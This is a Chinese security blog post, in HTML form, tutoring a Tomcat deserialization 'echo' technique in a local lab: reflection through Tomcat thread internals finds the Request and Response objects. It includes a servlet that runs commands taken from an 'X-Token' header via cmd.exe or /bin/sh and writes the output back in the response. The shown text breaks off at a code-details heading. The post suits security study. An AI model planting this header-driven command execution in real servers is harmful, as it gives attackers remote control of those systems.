@@ -1,0 +1,871 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatar.ico">
+  <link rel="icon" href="/img/avatar.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="pacemrc">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="基于全局变量的方式获取Request对象获取Response对象概述java-object-searcher 项目地址：https:&#x2F;&#x2F;github.com&#x2F;c0ny1&#x2F;java-object-searcher 该项目用于根据指定的关键字在内存中搜索指定的java对象 环境搭建Tomcat测试版本：v8.5.50、JDK1.8.0_50 创建Web项目   导入依赖&lt;dependency&amp;g">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Tomcat反序列化回显">
+<meta property="og:url" content="https://pacemrc.github.io/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Tomcat%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE/index.html">
+<meta property="og:site_name" content="白日梦想家">
+<meta property="og:description" content="基于全局变量的方式获取Request对象获取Response对象概述java-object-searcher 项目地址：https:&#x2F;&#x2F;github.com&#x2F;c0ny1&#x2F;java-object-searcher 该项目用于根据指定的关键字在内存中搜索指定的java对象 环境搭建Tomcat测试版本：v8.5.50、JDK1.8.0_50 创建Web项目   导入依赖&lt;dependency&amp;g">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231204172716241.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231204173226358.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231204173404288.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231204185833293.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231204173553507.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231204190104636.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231204190121158.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231204180827540.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231204174803050.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231204175212599.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231204181256443.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231204184845598.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231204192352464.png">
+<meta property="article:published_time" content="2024-03-11T07:26:31.000Z">
+<meta property="article:modified_time" content="2025-11-26T11:02:09.745Z">
+<meta property="article:author" content="pacemrc">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231204172716241.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Tomcat反序列化回显 - 白日梦想家</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"pacemrc.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"left","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>白日梦想家</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/category.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Tomcat反序列化回显"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        pacemrc
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-03-11 15:26" pubdate>
+          2024年3月11日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          12 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="padding-left: 2rem; margin-right: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-10 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Tomcat反序列化回显</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="基于全局变量的方式获取Request对象获取Response对象"><a href="#基于全局变量的方式获取Request对象获取Response对象" class="headerlink" title="基于全局变量的方式获取Request对象获取Response对象"></a>基于全局变量的方式获取Request对象获取Response对象</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p><strong>java-object-searcher</strong></p>
+<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/c0ny1/java-object-searcher">https://github.com/c0ny1/java-object-searcher</a></p>
+<p>该项目用于根据指定的关键字在内存中搜索指定的java对象</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>Tomcat测试版本：v8.5.50、JDK1.8.0_50</p>
+<p>创建Web项目</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231204172716241.png" srcset="/img/loading.gif" lazyload> </p>
+<h3 id="导入依赖"><a href="#导入依赖" class="headerlink" title="导入依赖"></a>导入依赖</h3><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.servlet<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javax.servlet-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre></div>
+
+<h3 id="创建Servlet"><a href="#创建Servlet" class="headerlink" title="创建Servlet"></a>创建Servlet</h3><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.pacemrc.javasec.rcecho;
+
+<span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;
+<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;
+<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;
+<span class="hljs-keyword">import</span> java.io.IOException;
+<span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;
+
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EchoServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;
+
+    <span class="hljs-meta">@Override</span>
+    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException &#123;
+
+        response.getWriter().print(<span class="hljs-string">&quot;ok&quot;</span>);
+
+        <span class="hljs-keyword">try</span> &#123;
+            <span class="hljs-type">Object</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> Util.getNeededRequestObject();
+            <span class="hljs-type">Object</span> <span class="hljs-variable">resp</span> <span class="hljs-operator">=</span> req.getClass().getMethod(<span class="hljs-string">&quot;getResponse&quot;</span>).invoke(req);
+            <span class="hljs-type">String</span> <span class="hljs-variable">header</span> <span class="hljs-operator">=</span> (String) req.getClass().getMethod(<span class="hljs-string">&quot;getHeader&quot;</span>, String.class).invoke(req, <span class="hljs-string">&quot;X-Token&quot;</span>);
+            <span class="hljs-keyword">if</span> (header != <span class="hljs-literal">null</span> &amp;&amp; !header.isEmpty()) &#123;
+                String[] cmd = <span class="hljs-literal">null</span>;
+                <span class="hljs-type">String</span> <span class="hljs-variable">os</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase();
+                <span class="hljs-keyword">if</span> (os.contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;
+                    cmd = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, header&#125;;
+                &#125; <span class="hljs-keyword">else</span> &#123;
+                    cmd = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, header&#125;;
+                &#125;
+                <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>).next();
+                <span class="hljs-comment">// doWrite</span>
+                resp.getClass().getMethod(<span class="hljs-string">&quot;setStatus&quot;</span>, Integer.TYPE).invoke(resp, <span class="hljs-number">200</span>);
+                <span class="hljs-keyword">try</span> &#123;
+                    resp.getClass().getDeclaredMethod(<span class="hljs-string">&quot;doWrite&quot;</span>, java.nio.ByteBuffer.class).invoke(resp, java.nio.ByteBuffer.wrap(result.getBytes()));
+                &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException | IllegalAccessException | InvocationTargetException e) &#123;
+                    <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.tomcat.util.buf.ByteChunk&quot;</span>);
+                    <span class="hljs-type">Object</span> <span class="hljs-variable">byteChunk</span> <span class="hljs-operator">=</span> clazz.newInstance();
+                    clazz.getDeclaredMethod(<span class="hljs-string">&quot;setBytes&quot;</span>, <span class="hljs-type">byte</span>[].class, Integer.TYPE, Integer.TYPE).invoke(byteChunk, result.getBytes(), <span class="hljs-number">0</span>, result.getBytes().length);
+                    resp.getClass().getMethod(<span class="hljs-string">&quot;doWrite&quot;</span>, clazz).invoke(resp, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;byteChunk&#125;);
+                &#125;
+            &#125;
+        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;&#125;
+    &#125;
+&#125;</code></pre></div>
+
+<h3 id="创建工具类"><a href="#创建工具类" class="headerlink" title="创建工具类"></a>创建工具类</h3><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.pacemrc.javasec.rcecho;
+
+<span class="hljs-keyword">import</span> me.gv7.tools.josearcher.entity.Blacklist;
+<span class="hljs-keyword">import</span> me.gv7.tools.josearcher.entity.Keyword;
+<span class="hljs-keyword">import</span> me.gv7.tools.josearcher.searcher.SearchRequstByBFS;
+
+<span class="hljs-keyword">import</span> java.lang.reflect.Field;
+<span class="hljs-keyword">import</span> java.util.ArrayList;
+<span class="hljs-keyword">import</span> java.util.List;
+
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Util</span> &#123;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName)</span> <span class="hljs-keyword">throws</span> Exception &#123;
+        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);
+        <span class="hljs-keyword">return</span> field.get(obj);
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> &#123;
+        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
+        <span class="hljs-keyword">try</span> &#123;
+            field = clazz.getDeclaredField(fieldName);
+            field.setAccessible(<span class="hljs-literal">true</span>);
+        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;
+            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)
+                field = getField(clazz.getSuperclass(), fieldName);
+        &#125;
+        <span class="hljs-keyword">return</span> field;
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getNeededRequestObject</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;
+        <span class="hljs-type">ThreadGroup</span> <span class="hljs-variable">threadGroup</span> <span class="hljs-operator">=</span> Thread.currentThread().getThreadGroup();
+        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> threadGroup.getClass().getDeclaredField(<span class="hljs-string">&quot;threads&quot;</span>);
+        field.setAccessible(<span class="hljs-literal">true</span>);
+        Thread[] threads = (Thread[]) field.get(threadGroup);
+
+        <span class="hljs-type">boolean</span> <span class="hljs-variable">isEcho</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
+
+        <span class="hljs-type">Object</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
+
+        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; threads.length; i++) &#123;
+            <span class="hljs-keyword">if</span> (isEcho) <span class="hljs-keyword">break</span>;
+
+            <span class="hljs-comment">// Thread 筛选</span>
+            <span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> threads[i];
+            <span class="hljs-keyword">if</span> (thread == <span class="hljs-literal">null</span>)
+                <span class="hljs-keyword">continue</span>;
+            <span class="hljs-type">String</span> <span class="hljs-variable">threadName</span> <span class="hljs-operator">=</span> thread.getName();
+            <span class="hljs-keyword">if</span> (!(
+                    ((threadName.contains(<span class="hljs-string">&quot;http-nio&quot;</span>) || threadName.contains(<span class="hljs-string">&quot;http-apr&quot;</span>)) &amp;&amp; threadName.contains(<span class="hljs-string">&quot;Poller&quot;</span>))
+                            || (threadName.contains(<span class="hljs-string">&quot;http-bio&quot;</span>) &amp;&amp; threadName.contains(<span class="hljs-string">&quot;AsyncTimeout&quot;</span>))
+                            || (threadName.contains(<span class="hljs-string">&quot;http-&quot;</span>) &amp;&amp; threadName.contains(<span class="hljs-string">&quot;Acceptor&quot;</span>))
+            ))
+                <span class="hljs-keyword">continue</span>;
+
+            <span class="hljs-type">Object</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> getFieldValue(thread, <span class="hljs-string">&quot;target&quot;</span>);
+            <span class="hljs-type">Object</span> <span class="hljs-variable">this0</span> <span class="hljs-operator">=</span> getFieldValue(target, <span class="hljs-string">&quot;this$0&quot;</span>);
+            <span class="hljs-type">Object</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> getFieldValue(this0, <span class="hljs-string">&quot;handler&quot;</span>);
+            <span class="hljs-type">Object</span> <span class="hljs-variable">global</span> <span class="hljs-operator">=</span> getFieldValue(handler, <span class="hljs-string">&quot;global&quot;</span>);
+            java.util.<span class="hljs-type">List</span> <span class="hljs-variable">processors</span> <span class="hljs-operator">=</span> (java.util.List) getFieldValue(global, <span class="hljs-string">&quot;processors&quot;</span>);
+
+            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; processors.size(); j++) &#123;
+                <span class="hljs-keyword">if</span> (isEcho) <span class="hljs-keyword">break</span>;
+
+                <span class="hljs-type">Object</span> <span class="hljs-variable">processor</span> <span class="hljs-operator">=</span> processors.get(j);
+                req = getFieldValue(processor, <span class="hljs-string">&quot;req&quot;</span>);
+
+            &#125;
+        &#125;
+        <span class="hljs-keyword">return</span> req;
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SearchAllRequestObject</span><span class="hljs-params">()</span> &#123;
+        <span class="hljs-comment">//设置搜索类型包含Request关键字的对象</span>
+        List&lt;Keyword&gt; keys = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
+        keys.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Keyword</span>.Builder().setField_type(<span class="hljs-string">&quot;Request&quot;</span>).build());
+        <span class="hljs-comment">//定义黑名单</span>
+        List&lt;Blacklist&gt; blacklists = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
+        blacklists.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Blacklist</span>.Builder().setField_type(<span class="hljs-string">&quot;java.io.File&quot;</span>).build());
+        <span class="hljs-comment">//新建一个广度优先搜索Thread.currentThread()的搜索器</span>
+        <span class="hljs-type">SearchRequstByBFS</span> <span class="hljs-variable">searcher</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SearchRequstByBFS</span>(Thread.currentThread(),keys);
+        <span class="hljs-comment">// 设置黑名单</span>
+        searcher.setBlacklists(blacklists);
+        <span class="hljs-comment">//打开调试模式,会生成log日志</span>
+        searcher.setIs_debug(<span class="hljs-literal">true</span>);
+        <span class="hljs-comment">//挖掘深度为20</span>
+        searcher.setMax_search_depth(<span class="hljs-number">20</span>);
+        <span class="hljs-comment">//设置报告保存位置</span>
+        searcher.setReport_save_path(<span class="hljs-string">&quot;D:\\tmp\\result&quot;</span>);
+        searcher.searchObject();
+    &#125;
+&#125;</code></pre></div>
+
+<h3 id="配置web-xml"><a href="#配置web-xml" class="headerlink" title="配置web.xml"></a>配置web.xml</h3><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>echo<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.pacemrc.javasec.rcecho.EchoServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span>
+
+<span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>echo<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/echo<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span></code></pre></div>
+
+<h3 id="配置Tomcat"><a href="#配置Tomcat" class="headerlink" title="配置Tomcat"></a>配置Tomcat</h3><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231204173226358.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>在doGet方法内下断点，debug运行Tomcat</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231204173404288.png" srcset="/img/loading.gif" lazyload> </p>
+<p>访问<a target="_blank" rel="noopener" href="http://localhost:8080/TomcatEcho/echoc%E8%A7%A6%E5%8F%91%E6%96%AD%E7%82%B9">http://localhost:8080/TomcatEcho/echoc触发断点</a></p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231204185833293.png" srcset="/img/loading.gif" lazyload> </p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231204173553507.png" srcset="/img/loading.gif" lazyload> </p>
+<h2 id="获取所有Request对象"><a href="#获取所有Request对象" class="headerlink" title="获取所有Request对象"></a>获取所有Request对象</h2><p>在断点代码处执行<code>Evaluate Expression</code>，执行以<code>Util.SearchAllRequestObject</code>方法在内存中寻找所有类名中包含<code>Request</code>关键字的对象</p>
+<div class="code-wrapper"><pre><code class="hljs abnf">Util.SearchAllRequestObject()<span class="hljs-comment">;</span></code></pre></div>
+
+<p>执行完成后会在指定的目录下创建查询结果文件</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231204190104636.png" srcset="/img/loading.gif" lazyload>  </p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231204190121158.png" srcset="/img/loading.gif" lazyload>  </p>
+<p><code>SearchRequstByBFS_result_*.txt</code>文件记录了所有满足查找条件对象，搜索关键字<code>global</code>关键字，发现有3个对象</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231204180827540.png" srcset="/img/loading.gif" lazyload>  </p>
+<h2 id="获取指定Request对象"><a href="#获取指定Request对象" class="headerlink" title="获取指定Request对象"></a>获取指定Request对象</h2><p>根据对象的路径筛选出发起请求的Request对象，在断点代码处执行代码获取当前线程</p>
+<div class="code-wrapper"><pre><code class="hljs autohotkey"><span class="hljs-keyword">Thread</span>.currentThread()</code></pre></div>
+
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231204174803050.png" srcset="/img/loading.gif" lazyload> </p>
+<p>根据<code>SearchRequstByBFS_result_*.txt</code>文件中对象存储的路径判断查找需要的<code>Request</code>对象，以第一个为例</p>
+<div class="code-wrapper"><pre><code class="hljs perl">TargetObject = &#123;org.apache.tomcat.util.threads.TaskThread&#125; 
+   ---&gt; group = &#123;java.lang.ThreadGroup&#125; 
+    ---&gt; threads = &#123;<span class="hljs-class"><span class="hljs-keyword">class</span> [<span class="hljs-title">Ljava</span>.<span class="hljs-title">lang</span>.<span class="hljs-title">Thread</span></span>;&#125; 
+     ---&gt; [<span class="hljs-number">15</span>] = &#123;java.lang.Thread&#125; 
+       ---&gt; target = &#123;org.apache.tomcat.util.net.NioEndpoint<span class="hljs-variable">$Poller</span>&#125; 
+        ---&gt; this<span class="hljs-variable">$0</span> = &#123;org.apache.tomcat.util.net.NioEndpoint&#125; 
+           ---&gt; handler = &#123;org.apache.coyote.AbstractProtocol<span class="hljs-variable">$ConnectionHandler</span>&#125; 
+            ---&gt; global = &#123;org.apache.coyote.RequestGroupInfo&#125;</code></pre></div>
+
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231204175212599.png" srcset="/img/loading.gif" lazyload> </p>
+<p>继续往下查找，发现<code>processors</code>数组列表字段中存储了需要的<code>Request</code>对象</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231204181256443.png" srcset="/img/loading.gif" lazyload> </p>
+<p>在断点处执行表达式，获取需要的Request对象，实现方法为不断递归反射指定对象</p>
+<div class="code-wrapper"><pre><code class="hljs abnf">Util.getNeededRequestObject()<span class="hljs-comment">;</span></code></pre></div>
+
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231204184845598.png" srcset="/img/loading.gif" lazyload> </p>
+<h2 id="获取Response对象"><a href="#获取Response对象" class="headerlink" title="获取Response对象"></a>获取Response对象</h2><p>获取需要的Request对象后，即可获取对应的Response对象。要实现服务端可接收我们传入的命令，可通过添加自定义头来实现，服务端接收到自定义头的值后作为命令执行的参数，最后将命令执行的结果写入Response对象的响应体中。</p>
+<p><strong>代码细节</strong></p>
